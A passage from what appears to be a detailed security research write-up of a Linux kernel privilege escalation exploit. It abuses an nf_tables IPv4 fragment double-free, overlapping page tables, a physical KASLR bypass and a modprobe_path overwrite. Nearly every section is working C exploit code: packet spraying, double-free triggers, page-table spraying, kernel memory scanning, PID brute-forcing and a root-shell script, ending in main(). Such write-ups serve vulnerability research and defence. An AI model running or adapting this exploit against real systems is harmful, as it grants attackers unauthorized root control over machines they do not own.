}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.2.2.1: The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>send_ipv4_ip_hdr()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, which abstracts away checksumming and socket code, when trying to send a raw IP packet.</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">static char intermed_buf[1 &lt;&lt; 19];

static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
{
	memset(intermed_buf, chr, dfsize);
	send_ipv4_ip_hdr(intermed_buf, dfsize, ip_header);
}

static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
{
	printf(&quot;[*] sending double free buffer packet...\n&quot;);
	send_ipv4_ip_hdr_chr(dfsize, ip_header, &apos;\x41&apos;);
}

static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (skb spray)

    // allocate and free 1 skb from freelist
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs((0 &gt;&gt; 3) | 0x2000);  // wait for other fragments. 8 &gt;&gt; 3 to make it wait or so?
	trigger_double_free_hdr(32768 + 8, &amp;df_ip_header);

    // ... (rest of the exploit)
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.2.2.2: Partial code for the exploit written in C, which sends the raw IP packet and triggers the nf_tables rule we set up earlier.</span></p></figcaption></figure><h5 id="5123-masking-the-double-free-with-skbs">5.1.2.3. Masking the double-free with skb&apos;s</h5><p>In order to prevent detection of the double-free and to improve stability of the exploit, we spray-free the UDP packets we allocated earlier.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static char intermed_buf[1 &lt;&lt; 19]; // simply pre-allocate intermediate buffers

static int sendto_ipv4_udp_server_sockfd;

void recv_ipv4_udp(int content_len)
{
    PRINTF_VERBOSE(&quot;[*] doing udp recv...\n&quot;);
    recv(sendto_ipv4_udp_server_sockfd, intermed_buf, content_len, 0);

	PRINTF_VERBOSE(&quot;[*] udp packet preview: %02hhx\n&quot;, intermed_buf[0]);
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.2.3.1: The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>recv_ipv4_udp()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, which abstracts away socket code when receiving an UDP packet.</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (trigger doublefree)

	// push N skbs to skb freelist
	for (int i=0; i &lt; CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		PRINTF_VERBOSE(&quot;[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n&quot;, i, CONFIG_SKB_SPRAY_AMOUNT);
		recv_ipv4_udp(1);
	}

    // ... (rest of the exploit)
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.2.3.2: Partial code for the exploit written in C, which frees the previously allocated sk_buff objects.</span></p></figcaption></figure><h5 id="5124-spraying-ptes">5.1.2.4. Spraying PTEs</h5><p>In order to spray PTEs we simply access the virtual memory pages in the VMA we registered earlier. Note that a PTE contains 512 pages, and therefore <code>0x20&apos;0000</code> bytes. Hence, we access once every <code>0x20&apos;0000</code> bytes a total of <code>CONFIG_PTE_SPRAY_AMOUNT</code> times.</p><p>In order to simplify this process, I wrote a macro which converts pagetable indices to virtual memory addresses. I.e. <code>mm-&gt;pgd[pud_nr][pmd_nr][pte_nr][page_nr]</code> is responsible for virtual memory page <code>PTI_TO_VIRT(pud_nr, pmd_nr, pte_nr, page_nr, 0)</code>. For example, <code>mm-&gt;pgd[1][0][0][0]</code> refers to the virtual memory page at <code>0x80&apos;0000&apos;0000</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-c ">#define _pte_index_to_virt(i) (i &lt;&lt; 12)
#define _pmd_index_to_virt(i) (i &lt;&lt; 21)
#define _pud_index_to_virt(i) (i &lt;&lt; 30)
#define _pgd_index_to_virt(i) (i &lt;&lt; 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))


static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (spray-free skb&apos;s)

	// spray-allocate the PTEs from PCP allocator order-0 list
	printf(&quot;[*] spraying %d pte&apos;s...\n&quot;, CONFIG_PTE_SPRAY_AMOUNT);
	for (unsigned long long i=0; i &lt; CONFIG_PTE_SPRAY_AMOUNT; i++)
		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
     
    // ... (rest of the exploit)
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.2.4.1: Partial code for the exploit written in C, which sprays PTE pages and defines a macro to convert pagetable indices to virtual addresses.</span></p></figcaption></figure><h5 id="5125-triggering-double-free-free-2">5.1.2.5. Triggering double-free free 2</h5><p>We previously drained the PCP list and allocated a bunch of PTEs on the page entry we freed with free 1. Now, we will do free 2 to use its page freelist entry to allocate an overlapping PMD.</p><p>We need to use a very specific combination of IP header options to circumvent certain checks in the IPv4 fragment queue code. For specific details, check the relevant background info and/or technique sections.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (spray-alloc PTEs)

	PRINTF_VERBOSE(&quot;[*] double-freeing skb...\n&quot;);

	// cause double-free on skb from earlier
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs(((32768 + 8) &gt;&gt; 3) | 0x2000);
	
	// skb1-&gt;len gets overwritten by s-&gt;random() in set_freepointer(). need to discard queue with tricks circumventing skb1-&gt;len
	// causes end == offset in ip_frag_queue(). packet will be empty
	// remains running until after both frees, a.k.a. does not require sleep
	alloc_intermed_buf_hdr(0, &amp;df_ip_header);

    // ... (rest of the exploit)
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.2.5.1: Partial code for the exploit written in C, which triggers the 2nd free of the double-free and navigates a specific IP fragment queue.</span></p></figcaption></figure><h5 id="5126-allocating-the-pmd">5.1.2.6. Allocating the PMD</h5><p>Now we have the 2nd freelist entry to the double-freed page (note that it has already been allocated by the PTE, so there are not 2 freelist entries at the same time), we can allocate the overlapping PMD to this page. This is incredibly complicated.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (free 2 of skb)

	// allocate overlapping PMD page (overlaps with PTE)
	*(unsigned long long*)_pmd_area = 0xCAFEBABE;

    // ... (rest of the exploit)
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.2.6.1: Partial code for the exploit written in C, which allocates the overlapping PMD page by writing to a userland page.</span></p></figcaption></figure><h5 id="5127-finding-the-overlapping-pte">5.1.2.7. Finding the overlapping PTE</h5><p>Now we have an overlapping PMD and PTE somewhere, we need to find out which of the sprayed PTEs is the overlapping one. This is a very easy procedure as well, as it involves checking which of the PTE areas has an PTE entry belonging to the PMD area. This is essentially equal to checking if the value is not the original value, indicating the page was overwritten. </p><p>In case we want to perform a manual sanity check, we also print physical address 0x0 to the user. This usually belongs to MMIO devices, but will usually look the same. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (allocate the overlapping PMD page)

	printf(&quot;[*] checking %d sprayed pte&apos;s for overlap...\n&quot;, CONFIG_PTE_SPRAY_AMOUNT);

	// find overlapped PTE area
	pte_area = NULL;
	for (unsigned long long i=0; i &lt; CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);

		// pte entry pte[0] should be the PFN+flags for &amp;_pmd_area
		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
		if (*test_target_addr != 0x41)
		{
			printf(&quot;[+] confirmed double alloc PMD/PTE\n&quot;);
			PRINTF_VERBOSE(&quot;    - PTE area index: %lld\n&quot;, i);
			PRINTF_VERBOSE(&quot;    - PTE area (write target address/page): %016llx (new)\n&quot;, *test_target_addr);
			pte_area = test_target_addr;
		}
	}

	if (pte_area == NULL)
	{
		printf(&quot;[-] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n&quot;, *(unsigned long long*)_pmd_area);

		return;
	}

    // set new pte value for sanity check
	*pte_area = 0x0 | 0x8000000000000867;

	flush_tlb(_pmd_area, 0x400000);
	PRINTF_VERBOSE(&quot;    - PMD area (read target value/page): %016llx (new)\n&quot;, *(unsigned long long*)_pmd_area);

    // (rest of the exploit)
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.2.7.1: Partial code for the exploit written in C, which allocates the overlapping PMD page by writing to a userland page.</span></p></figcaption></figure><h4 id="513-scanning-physical-memory">5.1.3. Scanning physical memory</h4><p>After we have set up the PUD+PMD double alloc, we can leverage the true potential of Dirty Pagedirectory: an kernel-space mirroring attack (KSMA) entirely from userland. We can now write physical addresses as PTE entries to a certain address within the PTE area, and then &quot;dereference&quot; it as a normal page of memory in the PMD area. </p><p>In this section, we will acquire the physical kernel base address and then use that to access the modprobe_path kernel variable with read/write privileges.</p><h5 id="5131-finding-kernel-base-address">5.1.3.1 Finding kernel base address</h5><p>Here, we apply the mentioned physical KASLR bypass to find the physical kernel base. Assuming a device with 8GiB physical memory, that reduces the memory that needs to be scanned from 8GiB to 2MiB worth of pages. Thankfully, we only need around ~40 bytes per page to decide if it is the kernel base, which means we need to read 512 * 40 =  20.480 bytes in the worst case to find the kernel base. </p><p>In order to determine if the page is the kernel base, I wrote the <a href="https://github.com/Notselwyn/get-sig" rel="noreferrer"><code>get-sig</code></a> Python scripts, which finds common bytes at the same addresses (signatures), filters out the signatures which are common in physical memory, and converts them into a memcmp statement. By increasing the amount of kernel samples, we can extend the support for other kernels (i.e. other compilers and old versions). The output looks something like the codeblock below.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static int is_kernel_base(unsigned char *addr)
{
	// thanks python
	
	// get-sig kernel_runtime_1
	if (memcmp(addr + 0x0, &quot;\x48\x8d\x25\x51\x3f&quot;, 5) == 0 &amp;&amp;
			memcmp(addr + 0x7, &quot;\x48\x8d\x3d\xf2\xff\xff\xff&quot;, 7) == 0)
		return 1;

	// get-sig kernel_runtime_2
	if (memcmp(addr + 0x0, &quot;\xfc\x0f\x01\x15&quot;, 4) == 0 &amp;&amp;
			memcmp(addr + 0x8, &quot;\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf&quot;, 12) == 0 &amp;&amp;
			memcmp(addr + 0x18, &quot;\x89\xde\x8b\x0d&quot;, 4) == 0 &amp;&amp;
			memcmp(addr + 0x20, &quot;\xc1\xe9\x02\xf3\xa5\xbc&quot;, 6) == 0 &amp;&amp;
			memcmp(addr + 0x2a, &quot;\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00&quot;, 24) == 0 &amp;&amp;
			memcmp(addr + 0x45, &quot;\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00&quot;, 15) == 0 &amp;&amp;
			memcmp(addr + 0x55, &quot;\x08\x00\xb9\x01\x01\x00\xc0\xb8&quot;, 8) == 0 &amp;&amp;
			memcmp(addr + 0x61, &quot;\x31\xd2\x0f\x30\xe8&quot;, 5) == 0 &amp;&amp;
			memcmp(addr + 0x6a, &quot;\x48\xc7\xc6&quot;, 3) == 0 &amp;&amp;
			memcmp(addr + 0x71, &quot;\x48\xc7\xc0\x80\x00\x00&quot;, 6) == 0 &amp;&amp;
			memcmp(addr + 0x78, &quot;\xff\xe0&quot;, 2) == 0)
		return 1;


	return 0;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.3.1.1: The </span><code spellcheck="false" style="white-space: pre-wrap;"><span>is_kernel_base()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, compares memory to signatures of the kernel base.</span></p></figcaption></figure><p>Now, it is time to scan. We fill the PTE page (which overlaps with the PMD page responsible for <code>pmd_kernel_area</code>) with all 512 pages which could be the kernel base page. If we had to scan more than 512 pages, we simply put the code in a loop with an incrementing PFN (physical address).</p><blockquote>To reiterate: it is 512 pages because we are dealing with 8GiB physical memory. If it were 4GiB, it would be 256 pages, since <code>4GiB / CONFIG_PHYSICAL_START = 256</code>.</blockquote><p>When we are setting the PTE entry in the PTE page (<code>pte_area[j] = (CONFIG_PHYSICAL_START * j) | 0x8000000000000867;</code>), we are setting both the PFN (<code>CONFIG_PHYSICAL_START * j</code>) which can be considered the physical address, and the coresponding flags (<code>0x8000000000000867</code>) like the permissions of said page (i.e. read/write). </p><p>Remember from the Dirty Pagedirectory section that because of the double-free: <code>mm-&gt;pgd[0][1]</code> (PMD) == <code>mm-&gt;pgd[0][2][0]</code> (PTE), and therefore <code>mm-&gt;pgd[0][1][x]</code> (PTE) == <code>mm-&gt;pgd[0][2][0][x]</code> (userland page) with x = 0-&gt;511. This means that we can overwrite 512 PTEs in the overlapping PMD with the 512 userland pages. These 512 PTEs are responsible for another 512 userland pages, which means we can set <code>512 * 512 * 0x1000 = 0x4000&apos;0000</code> (1GiB) of memory at a time.</p><p>For readability I use utilize only 2 PTEs from these 512 PTEs, and respectively use them as <code>pmd_kernel_area</code> (for scanning kernel bases) and <code>pmd_data_area</code> (for scanning kernel memory content).</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ... (setup dirty pagedirectory)

	// range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k &lt; (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		unsigned long long kernel_iteration_base;

		kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);

		PRINTF_VERBOSE(&quot;[*] setting kernel physical address range to 0x%016llx - 0x%016llx\n&quot;, kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * 512);
		for (unsigned short j=0; j &lt; 512; j++)
			pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;

		flush_tlb(_pmd_area, 0x400000);

		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j &lt; 512; j++) 
		{
			unsigned long long phys_kernel_base;
		
			// check for x64-gcc/clang signatures of kernel code segment at rest and at runtime
			// - this &quot;kernel base&quot; is actually the assembly bytecode of start_64() and variants
			// - it&apos;s different per architecture and per compiler (clang produces different signature than gcc)
			// - this can be derived from the vmlinux file by checking the second segment, which starts likely at binary offset 0x200000
			//   - i.e: xxd ./vmlinux | grep &apos;00200000:&apos;
			
			phys_kernel_base = kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j;

			PRINTF_VERBOSE(&quot;[*] phys kernel addr: %016llx, val: %016llx\n&quot;, phys_kernel_base, *(unsigned long long*)(pmd_kernel_area + j * 0x1000));

			if (is_kernel_base(pmd_kernel_area + j * 0x1000) == 0)
				continue;

            // ... (rest of the exploit)
		}
	}

	printf(&quot;[!] failed to find kernel code segment... TLB flush fail?\n&quot;);
	return;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.3.1.2: A part of the </span><code spellcheck="false" style="white-space: pre-wrap;"><span>privesc_flh_bypass_no_time()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, where it searches for the physical kernel base address.</span></p></figcaption></figure><h5 id="5132-finding-modprobepath">5.1.3.2. Finding modprobe_path</h5><p>Now we found the physical kernel base address, we will scan the memory beyond it. In order to identify modprobe_path, we scan for <code>CONFIG_MODPROBE_PATH</code> (<code>&quot;/sbin/modprobe&quot;</code>) with a <code>&apos;\x00&apos;</code> padding up to <code>KMOD_PATH_LEN</code> (256) bytes. We can verify if this address is correct by overwriting it and checking if <code>/proc/sys/kernel/modprobe</code> reflects this change, as this is a direct reference to <code>modprobe_path</code>. </p><p>Alternatively, the static usermode helper mitigation may be enabled. Fortunately for us this can be bypassed as well. Instead of searching for <code>&quot;/sbin/modprobe&quot;</code> we will simply search for <code>CONFIG_STATIC_USERMODEHELPER_PATH</code> (<code>&quot;/sbin/usermode-helper&quot;</code>) etc. Unfortunately there is no method to verify if this is the correct instance, but there should only be one match. </p><p>Then, when the target is found, we will try to overwrite it. If it fails, we will simply continue scanning for another target match.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ...

	// range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k &lt; (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		unsigned long long kernel_iteration_base;

        // ... (set 512 PTE entries in 1 PTE page)

		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j &lt; 512; j++) 
		{
			unsigned long long phys_kernel_base;

            // ... (find physical kernel base address)

			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
			for (int i=0; i &lt; 40; i++) 
			{
				void *pmd_modprobe_addr;
				unsigned long long phys_modprobe_addr;
				unsigned long long modprobe_iteration_base;

				modprobe_iteration_base = phys_kernel_base + i * 0x200000;

				PRINTF_VERBOSE(&quot;[*] setting physical address range to 0x%016llx - 0x%016llx\n&quot;, modprobe_iteration_base, modprobe_iteration_base + 0x200000);

				// set the pages for the other threads PUD data range to kernel memory
				for (unsigned short j=0; j &lt; 512; j++)
					pte_area[512 + j] = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000867;

				flush_tlb(_pmd_area, 0x400000);
				
#if CONFIG_STATIC_USERMODEHELPER
				pmd_modprobe_addr = memmem(pmd_data_area, 0x200000, CONFIG_STATIC_USERMODEHELPER_PATH, strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
#else
				pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x200000, modprobe_path, KMOD_PATH_LEN);
#endif
				if (pmd_modprobe_addr == NULL)
					continue;

#if CONFIG_LEET
				breached_the_mainframe();
#endif

				phys_modprobe_addr = modprobe_iteration_base + (pmd_modprobe_addr - pmd_data_area);
				printf(&quot;[+] verified modprobe_path/usermodehelper_path: %016llx (&apos;%s&apos;)...\n&quot;, phys_modprobe_addr, (char*)pmd_modprobe_addr);

                // ... (rest of the exploit)
			}
			
			printf(&quot;[-] failed to find correct modprobe_path: trying to find new kernel base...\n&quot;);
		}
	}

	printf(&quot;[!] failed to find kernel code segment... TLB flush fail?\n&quot;);
	return;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.3.2.1: A part of the </span><code spellcheck="false" style="white-space: pre-wrap;"><span>privesc_flh_bypass_no_time()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, where it searches for the physical modprobe_path address.</span></p></figcaption></figure><h4 id="514-overwriting-modprobepath">5.1.4. Overwriting modprobe_path</h4><p>Finally: we have read/write access to modprobe_path. Sadly, there&apos;s one final challenge left: getting the &quot;real&quot; PID of the exploit so we can execute <code>/proc/&lt;pid&gt;/fd</code> (the file descriptor containing the privesc script). Checking wether or not it succeeded is done in the next section.</p><blockquote>Even if we were using on-disk files, the exploit would need to know the PID, since we would need to use <code>/proc/&lt;pid&gt;/cwd</code> if we were in a mnt namespace. Of course in practice there are ways to circumvent this - such as using the PID shown in the kernel warning message - but I wanted to make this exploit as universal as possible.</blockquote><p>As you can see in the codeblock below, we overwrite modprobe_path or the static usermode helper string with <code>&quot;/proc/&lt;pid&gt;/fd/&lt;script_fd&gt;&quot;</code>, which refers to the privilege escalation script, mentioned in the next sections.</p><p>Note that the privilege escalation script (included in this codeblock) uses the PID of the current PID guess for shell purposes and for checking if the guess was correct.</p><figure class="kg-card kg-code-card"><pre><code class="language-c">#define MEMCPY_HOST_FD_PATH(buf, pid, fd) sprintf((buf), &quot;/proc/%u/fd/%u&quot;, (pid), (fd));

static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ...

	// run this script instead of /sbin/modprobe
	int modprobe_script_fd = memfd_create(&quot;&quot;, MFD_CLOEXEC);
	int status_fd = memfd_create(&quot;&quot;, 0);

	// range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k &lt; (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j &lt; 512; j++) 
		{
			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
			for (int i=0; i &lt; 40; i++) 
			{
				void *pmd_modprobe_addr;
				unsigned long long phys_modprobe_addr;
				unsigned long long modprobe_iteration_base;

                // ... (find modprobe_path)

				PRINTF_VERBOSE(&quot;[*] modprobe_script_fd: %d, status_fd: %d\n&quot;, modprobe_script_fd, status_fd);
				
				printf(&quot;[*] overwriting path with PIDs in range 0-&gt;4194304...\n&quot;);
				for (pid_t pid_guess=0; pid_guess &lt; 4194304; pid_guess++)
				{
					int status_cnt;
					char buf;

					// overwrite the `modprobe_path` kernel variable to &quot;/proc/&lt;pid&gt;/fd/&lt;script_fd&gt;&quot;
					// - use /proc/&lt;pid&gt;/* since container path may differ, may not be accessible, et cetera
					// - it must be root namespace PIDs, and can&apos;t get the root ns pid from within other namespace
					MEMCPY_HOST_FD_PATH(pmd_modprobe_addr, pid_guess, modprobe_script_fd);

					if (pid_guess % 50 == 0)
					{
						PRINTF_VERBOSE(&quot;[+] overwriting modprobe_path with different PIDs (%u-%u)...\n&quot;, pid_guess, pid_guess + 50);
						PRINTF_VERBOSE(&quot;    - i.e. &apos;%s&apos; @ %p...\n&quot;, (char*)pmd_modprobe_addr, pmd_modprobe_addr);
						PRINTF_VERBOSE(&quot;    - matching modprobe_path scan var: &apos;%s&apos; @ %p)...\n&quot;, modprobe_path, modprobe_path);
					}
						
					lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
					dprintf(modprobe_script_fd, &quot;#!/bin/sh\necho -n 1 1&gt;/proc/%u/fd/%u\n/bin/sh 0&lt;/proc/%u/fd/%u 1&gt;/proc/%u/fd/%u 2&gt;&amp;1\n&quot;, pid_guess, status_fd, pid_guess, shell_stdin_fd, pid_guess, shell_stdout_fd);

					// ... (rest of the exploit)
				}

				printf(&quot;[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n&quot;);

				return;
			}
			
			printf(&quot;[-] failed to find correct modprobe_path: trying to find new kernel base...\n&quot;);
		}
	}

	printf(&quot;[!] failed to find kernel code segment... TLB flush fail?\n&quot;);
	return;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.4.1: A part of the </span><code spellcheck="false" style="white-space: pre-wrap;"><span>privesc_flh_bypass_no_time()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, where it overwrites the </span><code spellcheck="false" style="white-space: pre-wrap;"><span>modprobe_path</span></code><span style="white-space: pre-wrap;"> kernel variable.</span></p></figcaption></figure><h4 id="515-dropping-root-shell">5.1.5. Dropping root shell</h4><p>In order to drop a rootshell, we execute run the invalid file using <code>modprobe_trigger_memfd()</code>, which takes advantage of the overwritten modprobe_path. The new modprobe_path points to the script (<code>/proc/&lt;pid&gt;/fd/&lt;fd&gt;</code>) below. It writes <code>1</code> to the newly allocated status file descriptor, which makes the exploit detect a successfull root shell and stop the execution. Then, it gives a shell to the console.</p><p>In order to universally drop a root shell - without making assumptions about namespaces, and keeping it fileless - I &quot;hijack&quot; the stdin and stdout file descriptors from the exploit and forward them to the root shell. This works on local machines, as well as reverse shells. Essentially - without file redirection functionality - the script runs:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/sh
echo -n 1 &gt; /proc/&lt;exploit_pid&gt;/fd/&lt;status_fd&gt;
/bin/sh 0&lt;/proc/&lt;exploit_pid&gt;/fd/0 1&gt;/proc/&lt;exploit_pid&gt;/fd/1 2&gt;&amp;</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.5.1: A BASH script executed as root, to pass the success rate and give the user a shell.</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-c">static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;

	fd = memfd_create(&quot;&quot;, MFD_CLOEXEC);
	write(fd, &quot;\xff\xff\xff\xff&quot;, 4);

	fexecve(fd, &amp;argv_envp, &amp;argv_envp);
	
	close(fd);
}


static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
    // ...

	// run this script instead of /sbin/modprobe
	int modprobe_script_fd = memfd_create(&quot;&quot;, MFD_CLOEXEC);
	int status_fd = memfd_create(&quot;&quot;, 0);

	// range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k &lt; (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j &lt; 512; j++) 
		{
			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
			for (int i=0; i &lt; 40; i++) 
			{
				for (pid_t pid_guess=0; pid_guess &lt; 65536; pid_guess++)
				{
					int status_cnt;
					char buf;

                    // ... (overwrite modprobe_path)

					// run custom modprobe file as root, by triggering it by executing file with unknown binfmt
					// if the PID is incorrect, nothing will happen
					modprobe_trigger_memfd();

					// indicates correct PID (and root shell). stops further bruteforcing
					status_cnt = read(status_fd, &amp;buf, 1);
					if (status_cnt == 0)
						continue;

					printf(&quot;[+] successfully breached the mainframe as real-PID %u\n&quot;, pid_guess);

					return;
				}

				printf(&quot;[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n&quot;);

				return;
			}
			
			printf(&quot;[-] failed to find correct modprobe_path: trying to find new kernel base...\n&quot;);
		}
	}

	printf(&quot;[!] failed to find kernel code segment... TLB flush fail?\n&quot;);
	return;
}
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Codeblock 5.1.5.2: A part of the </span><code spellcheck="false" style="white-space: pre-wrap;"><span>privesc_flh_bypass_no_time()</span></code><span style="white-space: pre-wrap;"> exploit function written in C, where it triggers the modprobe_path mechanism.</span></p></figcaption></figure><h4 id="516-post-exploit-stability">5.1.6. Post-exploit stability</h4><p>As a byproduct of our memory shenanigans, the pagetable pages for the exploit process are a tad unstable. Fortunately, this only becomes a problem when the process stops, so we can solve it by not making it stop. :^)</p><p>We do this using a simple sleep() call, which unfortunately makes the TTY of the user sleep as well, since the process is sleeping in the foreground. To circumvent this, we make the exploit spawn a child process which performs the actual exploit, and make the parent exit when it is sementically supposed to. </p><p>Additionally, we register a signal handler for the children for <code>SIGINT</code> which will handle (among others) keyboard interrupts. This causes our child process to sleep in the background. The parent is not affected, as the handler is set in the child process. </p><blockquote>Notice that we cannot use wait() as the child processes will remain running in the background.</blockquote><figure class="kg-card kg-code-card"><pre><code class="language-c">int main()
{
	int *exploit_status;

	exploit_status = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*exploit_status = EXPLOIT_STAT_RUNNING;

	// detaches program and makes it sleep in background when succeeding or failing
	// - prevents kernel system instability when trying to free resources
	if (fork() == 0)
	{
		int shell_stdin_fd;
		int shell_stdout_fd;

		signal(SIGINT, signal_handler_sleep);

		// open copies of stdout etc which will not be redirected when stdout is redirected, but will be printed to user
		shell_stdin_fd = dup(STDIN_FILENO);
		shell_stdout_fd = dup(STDOUT_FILENO);

#if CONFIG_REDIRECT_LOG
		setup_log(&quot;exp.log&quot;);
#endif

		setup_env();
 
		privesc_flh_bypass_no_time(shell_stdin_fd, shell_stdout_fd);

		*exploit_status = EXPLOIT_STAT_FINISHED;

		// prevent crashes due to invalid pagetables
		sleep(9999);
	}

	// prevent premature exits
	SPINLOCK(*exploit_status == EXPLOIT_STAT_RUNNING);

	return 0;
